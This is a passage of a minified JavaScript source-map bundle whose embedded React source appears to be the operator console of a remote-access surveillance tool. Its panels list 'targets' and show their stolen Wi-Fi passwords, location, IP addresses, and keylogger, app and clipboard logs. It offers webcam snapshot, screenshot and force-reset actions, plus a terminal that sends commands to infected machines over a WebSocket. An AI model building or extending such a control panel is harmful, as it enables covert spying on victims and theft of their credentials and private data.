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","file":"static/js/main.ca956343.chunk.js","sourcesContent":["export const border = \"#2e4a52\";\r\nexport const a = {\r\n  r: 168,\r\n  g: 206,\r\n  b: 208\r\n}\r\nexport const accent = `rgb(${a.r}, ${a.g}, ${a.b})`;\r\nexport const accentLight = \"#6a8f91\";\r\nexport const bg = \"#0D1015\";","import React, { Component } from \"react\";\r\nimport { border } from \"../colors\";\r\n\r\nclass Divider extends Component {\r\n  render() {\r\n    const bg = border;\r\n    const verticalBar = <div style={{ width: 1, height: 8, background: bg }} />;\r\n\r\n    return (\r\n      <div style={{ display: \"flex\", alignItems: \"center\" }}>\r\n        {verticalBar}\r\n        <div style={{ flexGrow: 1, height: 0.8, background: bg }} />\r\n        {verticalBar}\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Divider;\r\n","import React, { Component, Fragment } from \"react\";\r\nimport { css } from \"emotion\";\r\nimport { bg, border } from \"../colors\";\r\nimport Divider from \"./Divider\";\r\n\r\nconst dottedBackground = (\r\n  bg: string,\r\n  dot: string,\r\n  space: number,\r\n  size: number\r\n) => css`\r\n  background: linear-gradient(90deg, ${bg} ${space - size}px, transparent 1%)\r\n      center,\r\n    linear-gradient(${bg} ${space - size}px, transparent 1%) center, ${dot};\r\n  background-size: ${space}px ${space}px;\r\n`;\r\n\r\nconst style = css`\r\n  user-select: none;\r\n  display: flex;\r\n  justify-content: center;\r\n  padding: 15px 0 8px;\r\n  font-size: 40px;\r\n  ${dottedBackground(bg, border, 20, 2)}\r\n`;\r\n\r\nclass Clock extends Component {\r\n  componentDidMount() {\r\n    setInterval(() => {\r\n      this.forceUpdate();\r\n    }, 1000);\r\n  }\r\n\r\n  render() {\r\n    const now = new Date();\r\n    let h = `${now.getHours()}`;\r\n    let m = `${now.getMinutes()}`;\r\n    let s = `${now.getSeconds()}`;\r\n    h = h.length == 1 ? \"0\" + h : h;\r\n    m = m.length == 1 ? \"0\" + m : m;\r\n    s = s.length == 1 ? \"0\" + s : s;\r\n\r\n    return (\r\n      <Fragment>\r\n        <Divider />\r\n        <div className={style}>\r\n          <div>\r\n            {h}:{m}:{s}\r\n          </div>\r\n        </div>\r\n      </Fragment>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Clock;\r\n","import React, { Component, CSSProperties } from \"react\";\r\nimport { css } from \"emotion\";\r\nimport { FontWeightProperty, FontSizeProperty } from \"csstype\";\r\nimport { accentLight, accent } from \"../colors\";\r\n\r\ninterface TextProps {\r\n  color?: \"default\" | \"darker\";\r\n  weight?: FontWeightProperty;\r\n  size?: FontSizeProperty<0>;\r\n  type?: \"text\";\r\n  font?: string;\r\n  block?: boolean;\r\n\r\n  style?: CSSProperties;\r\n  [key: string]: any;\r\n}\r\n\r\nclass Text extends Component<TextProps> {\r\n  static defaultProps = {\r\n    color: \"default\",\r\n    type: \"text\"\r\n  };\r\n\r\n  render() {\r\n    const { color, weight, type, font, size, block, ...other } = this.props;\r\n    let c = accent;\r\n    if (color == \"darker\") c = accentLight;\r\n\r\n    const style = css`\r\n      display: ${block ? \"block\" : \"inline-block\"};\r\n      color: ${c};\r\n      font-weight: ${weight};\r\n      font-family: ${font};\r\n      font-size: ${size};\r\n    `;\r\n    return <div className={style} {...other} />;\r\n  }\r\n}\r\n\r\nexport default Text;","import { css } from \"emotion\";\r\n\r\nimport { border, a, accent, bg } from \"./colors\";\r\n\r\nexport const grid = css`\r\n  font-size: 13px;\r\n  background: ${bg};\r\n  color: ${accent};\r\n  height: 100vh;\r\n  display: grid;\r\n  grid-template-columns: 300px auto 300px;\r\n  grid-template-rows: 30px auto 300px;\r\n  grid-template-areas:\r\n    \"topbar topbar topbar\"\r\n    \"left main right\"\r\n    \"bottom bottom bottom\";\r\n`;\r\n\r\nexport const top = css`\r\n  grid-area: topbar;\r\n  display: flex;\r\n  justify-content: center;\r\n  align-items: center;\r\n  margin: 0 10px;\r\n`;\r\n\r\nexport const main = css`\r\n  grid-area: main;\r\n  border: solid 1px ${border};\r\n  border-radius: 3px;\r\n  overflow: auto;\r\n`;\r\n\r\nexport const left = css`\r\n  grid-area: left;\r\n  padding: 0 10px;\r\n  overflow: auto;\r\n  border-bottom: solid 1px ${border};\r\n`;\r\n\r\nexport const right = css`\r\n  grid-area: right;\r\n  padding: 0 10px;\r\n  overflow: auto;\r\n  border-bottom: solid 1px ${border};\r\n`;\r\n\r\nexport const bottom = css`\r\n  grid-area: bottom;\r\n  overflow: auto;\r\n  display: grid;\r\n  grid-template-columns: repeat(5, 1fr);\r\n  grid-template-rows: 100%;\r\n  grid-template-areas: \"keylogger applogger clipboardlogger files files\";\r\n`;\r\n","import React, { Component, Fragment } from \"react\";\r\nimport { css } from \"emotion\";\r\nimport Text from \"./Text\";\r\nimport Divider from \"./Divider\";\r\n\r\ninterface TileProps {\r\n  leading?: any;\r\n  title: string;\r\n  children?: any;\r\n  rawContent?: boolean;\r\n  divider?: boolean;\r\n  actions?: any;\r\n  collapsed?: boolean;\r\n  cillapsible?: boolean;\r\n\r\n  [key: string]: any;\r\n}\r\n\r\nconst styles = {\r\n  root: css`\r\n    padding: 2px 8px;\r\n    text-overflow: clip;\r\n    word-wrap: break-word;\r\n    overflow-wrap: break-word;\r\n    white-space: pre-wrap;\r\n  `,\r\n  content: css`\r\n    padding: 4px 6px;\r\n  `,\r\n  toolbar: css`\r\n    user-select: none;\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: space-between;\r\n  `,\r\n  titleGroup: css`\r\n    display: flex;\r\n    align-items: center;\r\n  `,\r\n};\r\n\r\nclass Tile extends Component<TileProps> {\r\n  static defaultProps = {\r\n    divider: true,\r\n    collapsible: true\r\n  };\r\n\r\n  state = {\r\n    collapsed: false\r\n  };\r\n\r\n  componentDidMount() {\r\n    this.setState({ collapsed: this.props.collapsed });\r\n  }\r\n\r\n  toggle = () => {\r\n    console.log(this.state.collapsed);\r\n    this.setState({ collapsed: !this.state.collapsed });\r\n  };\r\n\r\n  render() {\r\n    const {\r\n      title,\r\n      children,\r\n      rawContent,\r\n      divider,\r\n      actions,\r\n      collapsible,\r\n      leading,\r\n      ...other\r\n    } = this.props;\r\n\r\n    const { collapsed } = this.state;\r\n\r\n    return (\r\n      <Fragment>\r\n        {divider && <Divider />}\r\n        <div className={styles.root} {...other}>\r\n          <div className={styles.toolbar}>\r\n            <div className={styles.titleGroup}>\r\n              {leading && leading}\r\n              <Text\r\n                onClick={collapsible ? this.toggle : null}\r\n                weight={500}\r\n                size=\"15px\"\r\n                style={{ cursor: \"pointer\" }}\r\n              >\r\n                {title}\r\n              </Text>\r\n            </div>\r\n            {actions && actions}\r\n          </div>\r\n          {(!collapsed || !collapsible) &&\r\n            (rawContent ? (\r\n              children\r\n            ) : (\r\n              <div className={styles.content}>{children}</div>\r\n            ))}\r\n        </div>\r\n      </Fragment>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Tile;\r\n","import React, { Component } from \"react\";\r\nimport Text from \"./Text\";\r\n\r\ninterface TableProps {\r\n  data: { [key: string]: any };\r\n  flipped?: boolean;\r\n}\r\n\r\nclass Table extends Component<TableProps> {\r\n  render() {\r\n    const { data, flipped } = this.props;\r\n\r\n    if (flipped)\r\n      return (\r\n        <div style={{ display: \"flex\", justifyContent: \"space-between\" }}>\r\n          {Object.keys(data).map(key => (\r\n            <div key={key} style={{ display: \"flex\", flexDirection: \"column\" }}>\r\n              <Text color=\"darker\" weight={300}>\r\n                {key}\r\n              </Text>\r\n              <Text>{data[key]}</Text>\r\n            </div>\r\n          ))}\r\n        </div>\r\n      );\r\n\r\n    return (\r\n      <div>\r\n        {Object.keys(data).map(key => (\r\n          <div\r\n            key={key}\r\n            style={{\r\n              padding: \"2px 2px\",\r\n              display: \"flex\",\r\n              justifyContent: \"space-between\"\r\n            }}\r\n          >\r\n            <Text color=\"darker\" weight={300} style={{userSelect: \"none\"}}>\r\n              {key}\r\n            </Text>\r\n            <Text>{data[key]}</Text>\r\n          </div>\r\n        ))}\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Table;","import React, { Component } from \"react\";\r\nimport { css } from \"emotion\";\r\n\r\nclass DotIndicatorProps {\r\n  value: boolean = false;\r\n  activeColor?: string = \"#5eff86\";\r\n  inactiveColor?: string = \"#f72222\";\r\n}\r\n\r\nclass DotIndicator extends Component<DotIndicatorProps> {\r\n  static defaultProps = new DotIndicatorProps();\r\n\r\n  render() {\r\n    const { value, activeColor, inactiveColor, ...other } = this.props;\r\n    const size = 7;\r\n    const style = css`\r\n      margin: 1px 5px;\r\n      width: ${size}px;\r\n      height: ${size}px;\r\n      border-radius: 50%;\r\n      display: inline-block;\r\n      background: ${value ? activeColor : inactiveColor};\r\n    `;\r\n    return <div className={style} {...other} />;\r\n  }\r\n}\r\n\r\nexport default DotIndicator;\r\n","import React, {Component} from 'react';\r\nimport Tile from '../../components/Tile';\r\nimport Text from '../../components/Text';\r\nimport Table from '../../components/Table';\r\nimport DotIndicator from '../../components/DotIndicator';\r\n\r\nclass NetworkStatus extends Component<{online: boolean, targetConnected: boolean}> {\r\n  render() {\r\n    const {online, targetConnected} = this.props;\r\n\r\n    return <Tile title=\"NETWORK STATUS\">\r\n    <Table\r\n      flipped\r\n      data={{\r\n        STATE: (\r\n          <div>\r\n            <Text>{online ? \"ONLINE\" : \"OFFLINE\"}</Text>\r\n            <DotIndicator value={online} />\r\n          </div>\r\n        ),\r\n        TARGET: (\r\n          <div>\r\n            <Text>\r\n              {targetConnected ? \"CONNECTED\" : \"DISCONNECTED\"}\r\n            </Text>\r\n            <DotIndicator value={targetConnected} />\r\n          </div>\r\n        )\r\n      }}\r\n    />\r\n  </Tile>;\r\n  }\r\n}\r\n\r\nexport default NetworkStatus;","import React, { Component } from \"react\";\r\nimport { Target } from \"../../models/target\";\r\nimport Tile from \"../../components/Tile\";\r\nimport Table from \"../../components/Table\";\r\n\r\nexport interface DeviceViewProps {\r\n  target: Target;\r\n}\r\n\r\nclass DeviceView extends Component<DeviceViewProps> {\r\n  render() {\r\n    const { target } = this.props;\r\n\r\n    return (\r\n      <Tile title=\"DEVICE\">\r\n        <Table data={{ CPU: target.hardware!.cpu }} />\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default DeviceView;\r\n","import styled from '@emotion/styled';\r\nimport { a } from '../colors';\r\n\r\nconst IconButton = styled(\"div\")`\r\n  user-select: none;\r\n  display: block;\r\n  height: 22px;\r\n  width: 22px;\r\n  display: flex;\r\n  justify-content: center;\r\n  align-items: center;\r\n  cursor: pointer;\r\n  &, * {\r\n    font-size: 18px;\r\n  }\r\n  transition: all 0.2s ease;\r\n  border-radius: 50%;\r\n  :hover {\r\n    background: rgba(${a.r}, ${a.g}, ${a.b},0.1);\r\n  }\r\n  :active {\r\n    background: rgba(${a.r}, ${a.g}, ${a.b},0.2);\r\n  }\r\n`;\r\nexport default IconButton;","import React, { Component } from \"react\";\r\nimport Text from \"../../components/Text\";\r\nimport { Target } from \"../../models/target\";\r\nimport Tile from \"../../components/Tile\";\r\nimport Table from \"../../components/Table\";\r\nimport IconButton from \"../../components/IconButton\";\r\n\r\nexport interface LocationViewProps {\r\n  target: Target;\r\n}\r\n\r\nclass LocationView extends Component<LocationViewProps> {\r\n  openMap = () => {\r\n    const {latitude, longitude} = this.props.target.location!;\r\n    window.open(`http://maps.google.com/maps?daddr=${latitude},${longitude}&amp;ll=`, \"blank\");\r\n  }\r\n  render() {\r\n    const { target } = this.props;\r\n\r\n    return (\r\n      <Tile title=\"LOCATION\" actions={\r\n        <div>\r\n          <IconButton onClick={this.openMap}>\r\n            <i className=\"material-icons\">map</i>\r\n          </IconButton>\r\n        </div>\r\n      }>\r\n        <Table\r\n          data={{\r\n            COUNTRY: target.location!.country,\r\n            CITY: target.location!.city,\r\n            LATITUDE: target.location!.latitude,\r\n            LONGITUDE: target.location!.longitude,\r\n            ACCURACY: target.location!.accuracy\r\n          }}\r\n        />\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default LocationView;\r\n","import React, { Component } from \"react\";\r\nimport { Target } from \"../../models/target\";\r\nimport Tile from \"../../components/Tile\";\r\nimport Table from \"../../components/Table\";\r\n\r\nexport interface NetworkViewProps {\r\n  target: Target;\r\n}\r\n\r\nclass NetworkView extends Component<NetworkViewProps> {\r\n  render() {\r\n    const { target } = this.props;\r\n\r\n    return (\r\n      <Tile title=\"NETWORK\">\r\n        <Table\r\n          data={{\r\n            IP: target.net.publicIP,\r\n            \"PRIVATE IP\": target.net.privateIP,\r\n            HOSTNAME: target.net.host\r\n          }}\r\n        />\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default NetworkView;\r\n","import React, { Component } from \"react\";\r\nimport { Target } from \"../../models/target\";\r\nimport Tile from \"../../components/Tile\";\r\nimport Table from \"../../components/Table\";\r\n\r\nexport interface WifiViewProps {\r\n  target: Target;\r\n}\r\n\r\nclass WifiView extends Component<WifiViewProps> {\r\n  render() {\r\n    const { target } = this.props;\r\n    const data = Object.keys(target.wifi!)\r\n      .map(name => ({\r\n        [name]: target.wifi![name]\r\n      }))\r\n      .reduce((a, b) => ({ ...a, ...b }), {});\r\n\r\n    return (\r\n      <Tile title=\"WIFI PASSWORDS\">\r\n        <Table data={data} />\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default WifiView;\r\n","import React, { Component } from \"react\";\r\nimport ReactJson from \"react-json-view\";\r\n\r\nimport Tile from \"../../components/Tile\";\r\nimport { Target } from \"../../models/target\";\r\n\r\nclass ExplorerView extends Component<{ target: Target }> {\r\n  render() {\r\n    const { target } = this.props;\r\n    return (\r\n      <Tile title=\"EXPLORER\">\r\n        <ReactJson\r\n          style={{ background: \"transparent\", fontFamily: \"inherit\" }}\r\n          displayDataTypes={false}\r\n          src={target}\r\n          indentWidth={2}\r\n          collapseStringsAfterLength={20}\r\n          theme=\"grayscale\"\r\n        />\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default ExplorerView;\r\n","import React, { Component, Fragment } from \"react\";\r\nimport { css } from \"emotion\";\r\n\r\nimport Tile from \"../../components/Tile\";\r\nimport Text from \"../../components/Text\";\r\nimport { Target } from \"../../models/target\";\r\nimport DotIndicator from \"../../components/DotIndicator\";\r\nimport { accent, a } from \"../../colors\";\r\n\r\nimport { ContextMenu, MenuItem, ContextMenuTrigger } from \"react-contextmenu\";\r\n\r\nconst targetListItem = css`\r\n  width: 100%;\r\n  user-select: none;\r\n  font-size: 14px;\r\n  font-weight: 300;\r\n  cursor: pointer;\r\n  transition: all 0.1s ease;\r\n  padding: 4px 2px;\r\n  border-radius: 2px;\r\n  margin-bottom: 2px;\r\n  :hover {\r\n    background: rgba(${a.r}, ${a.g}, ${a.b}, 0.1);\r\n  }\r\n  :active {\r\n    background: rgba(${a.r}, ${a.g}, ${a.b}, 0.2);\r\n  }\r\n`;\r\n\r\nconst styles = {\r\n  contextMenu: css`\r\n    min-width: 180px;\r\n    padding: 6px 0;\r\n    background: rgba(0, 0, 0, 0.9);\r\n    border-radius: 4px;\r\n    box-shadow: 0px 0px 8px 2px rgba(255, 255, 255, 0.1);\r\n  `,\r\n  menuItem: css`\r\n    font-size: 14px;\r\n    cursor: pointer;\r\n    user-select: none;\r\n    display: flex;\r\n    align-items: center;\r\n    box-sizing: border-box;\r\n    padding: 8px 12px;\r\n    transition: all 0.2s ease;\r\n    :hover {\r\n      background: rgba(255, 255, 255, 0.05);\r\n    }\r\n    :active {\r\n      background: rgba(255, 255, 255, 0.1);\r\n    }\r\n  `,\r\n  menuItemIcon: css`\r\n    margin-right: 8px;\r\n  `\r\n};\r\n\r\nconst TargetListItem = ({\r\n  target,\r\n  value,\r\n  ...other\r\n}: {\r\n  target?: Target;\r\n  value: string;\r\n  [key: string]: any;\r\n}) => (\r\n  <div\r\n    className={targetListItem}\r\n    style={{ display: \"flex\", alignItems: \"center\" }}\r\n    {...other}\r\n  >\r\n    <DotIndicator\r\n      value={target && value === target!.key}\r\n      activeColor={accent}\r\n      inactiveColor=\"rgba(255,255,255,0.2)\"\r\n    />\r\n    <Text>{value}</Text>\r\n  </div>\r\n);\r\n\r\nconst items = [\r\n  { icon: \"fullscreen\", name: \"SCREENSHOT\" },\r\n  { icon: \"camera\", name: \"WEBCAM SNAPSHOT\" },\r\n  { icon: \"refresh\", name: \"FORCE RESET\" },\r\n];\r\n\r\ninterface TriggerContextMenuProps {\r\n  onMenu: (action: string) => void;\r\n  id: string;\r\n  [key: string]: any;\r\n}\r\n\r\nconst TriggerContextMenu = ({\r\n  onMenu,\r\n  id,\r\n  ...props\r\n}: TriggerContextMenuProps) => (\r\n  <ContextMenu id={id} className={styles.contextMenu} {...props}>\r\n    {items.map((item, i) => (\r\n      <MenuItem\r\n        key={i}\r\n        onClick={() => onMenu(item.name)}\r\n        attributes={{ className: styles.menuItem }}\r\n      >\r\n        <i className={`material-icons ${styles.menuItemIcon}`}>{item.icon}</i>\r\n        <Text size=\"12px\">{item.name}</Text>\r\n      </MenuItem>\r\n    ))}\r\n  </ContextMenu>\r\n);\r\n\r\ninterface TargetListViewState {\r\n  targets: string[];\r\n  target?: Target;\r\n  onMenu: (key: string, action: string) => void;\r\n  onSelect: (key: string) => void;\r\n}\r\n\r\nclass TargetListView extends Component<TargetListViewState> {\r\n  render() {\r\n    const { targets, target, onSelect, onMenu } = this.props;\r\n\r\n    return (\r\n      <Tile title=\"TARGETS\">\r\n        {targets.map((v, i) => (\r\n          <Fragment key={i}>\r\n            <ContextMenuTrigger id={`menu-${i}`}>\r\n              <TargetListItem\r\n                target={target}\r\n                value={v}\r\n                onClick={() => onSelect(v)}\r\n              />\r\n            </ContextMenuTrigger>\r\n            <TriggerContextMenu\r\n              onMenu={action => onMenu(v, action)}\r\n              id={`menu-${i}`}\r\n            />\r\n          </Fragment>\r\n        ))}\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default TargetListView;\r\n","import React, { Component, ChangeEvent, KeyboardEvent, RefObject } from \"react\";\r\nimport { css } from \"emotion\";\r\n\r\nimport Text from \"../../components/Text\";\r\nimport { StdoutLine } from \"../../models/stdoutLine\";\r\n\r\nconst root = css`\r\n  height: calc(100% - 20px);\r\n  margin: 8px 10px;\r\n  overflow-y: auto;\r\n  overflow-x: hidden;\r\n  font-size: 13px;\r\n  word-wrap: break-word;\r\n  text-overflow: clip;\r\n  overflow-wrap: break-word;\r\n  white-space: pre-wrap;\r\n`;\r\n\r\nconst input = css`\r\n  font-family: inherit !important;\r\n  font-size: inherit;\r\n  color: inherit;\r\n  background: transparent;\r\n  border: none;\r\n  outline: none;\r\n  flex: 1 1;\r\n`;\r\n\r\ninterface TerminalProps {\r\n  onEnter: (value: string) => void;\r\n  stdout: StdoutLine[];\r\n  inputRef: RefObject<HTMLInputElement>;\r\n}\r\n\r\nclass TerminalState {\r\n  value: string = \"\";\r\n  history: string[] = [];\r\n  historyIndex: number = -1;\r\n}\r\n\r\nclass Terminal extends Component<TerminalProps, TerminalState> {\r\n  state = new TerminalState();\r\n\r\n  componentDidMount() {\r\n    const local = localStorage.getItem(\"commandHistory\");\r\n    if (local) {\r\n      this.setState({\r\n        history: JSON.parse(local)\r\n      });\r\n    }\r\n  }\r\n\r\n  saveHistory = (history: string[]) => {\r\n    localStorage.setItem(\"commandHistory\", JSON.stringify(history));\r\n  };\r\n\r\n  onChange = (e: ChangeEvent<HTMLInputElement>) => {\r\n    this.setState({ value: e.target.value, historyIndex: -1 });\r\n  };\r\n\r\n  handleArrow = (isUp: boolean) => {\r\n    let { history, historyIndex } = this.state;\r\n    historyIndex += isUp ? 1 : -1;\r\n    const i = history.length - 1 - historyIndex;\r\n    if (i in history) {\r\n      this.setState(\r\n        {\r\n          value: history[i],\r\n          historyIndex\r\n        },\r\n        () => {\r\n          this.props.inputRef.current!.scrollIntoView(false);\r\n        }\r\n      );\r\n    }\r\n  };\r\n\r\n  onKeyDown = (ev: KeyboardEvent<HTMLInputElement>) => {\r\n    const { value } = this.state;\r\n    if (ev.key === \"Enter\" && value.length > 0) {\r\n      this.props.onEnter(value);\r\n      const { history } = this.state;\r\n      const newHistory = [...history, value];\r\n      this.setState({ value: \"\", history: newHistory });\r\n      this.saveHistory(newHistory);\r\n    } else if (ev.key === \"ArrowUp\") {\r\n      ev.preventDefault();\r\n      this.handleArrow(true);\r\n    } else if (ev.key === \"ArrowDown\") {\r\n      ev.preventDefault();\r\n      this.handleArrow(false);\r\n    }\r\n  };\r\n\r\n  onClick = (e: any) => {\r\n    if (e.target.id === \"terminal\") this.props.inputRef.current!.focus();\r\n  };\r\n\r\n  render() {\r\n    const { inputRef, stdout } = this.props;\r\n    const { value } = this.state;\r\n\r\n    return (\r\n      <pre id=\"terminal\" onClick={this.onClick} className={root}>\r\n        <code>\r\n          {stdout.map((line, i) => (\r\n            <Text\r\n              block\r\n              key={i}\r\n              weight={300}\r\n              color=\"darker\"\r\n              style={line.error ? { color: \"#F44336\" } : {}}\r\n            >\r\n              {line.value}\r\n            </Text>\r\n          ))}\r\n          <div style={{ display: \"flex\", width: \"100%\" }}>\r\n            <Text weight={300}>> </Text>\r\n            <input\r\n              ref={inputRef}\r\n              className={input}\r\n              value={value}\r\n              onChange={this.onChange}\r\n              onKeyDown={this.onKeyDown}\r\n              autoCapitalize=\"false\"\r\n              autoCorrect=\"false\"\r\n              spellCheck={false}\r\n            />\r\n          </div>\r\n        </code>\r\n      </pre>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Terminal;\r\n","import React, { Component, Fragment } from \"react\";\r\nimport { Target } from \"../../models/target\";\r\nimport Tile from \"../../components/Tile\";\r\nimport Text from \"../../components/Text\";\r\nimport { border, accentLight } from \"../../colors\";\r\nimport IconButton from \"../../components/IconButton\";\r\n\r\nclass LoggerView extends Component<{\r\n  log: string[];\r\n  style?: any;\r\n  title: string;\r\n  onClear: () => void;\r\n}> {\r\n  endOfLog = React.createRef<HTMLDivElement>();\r\n\r\n  componentDidUpdate() {\r\n    this.endOfLog.current!.scrollIntoView(false);\r\n  }\r\n\r\n  render() {\r\n    const { log, style, title, onClear } = this.props;\r\n\r\n    return (\r\n      <Tile\r\n        divider={false}\r\n        rawContent={true}\r\n        title={title}\r\n        style={{\r\n          borderRight: `solid 1px ${border}`,\r\n          overflow: \"auto\",\r\n          color: accentLight,\r\n          padding: \"4px 5px\",\r\n          ...style\r\n        }}\r\n        actions={\r\n          <Fragment>\r\n            <IconButton onClick={onClear}>\r\n              <i className=\"material-icons\">clear</i>\r\n            </IconButton>\r\n          </Fragment>\r\n        }\r\n      >\r\n        {log.map((l, i) => (\r\n          <Text color=\"darker\" key={i} block>\r\n            {l}\r\n          </Text>\r\n        ))}\r\n        <div ref={this.endOfLog} />\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default LoggerView;\r\n","export const downloadBytes = (data: Uint8Array[], name: string) => {\r\n  const a = 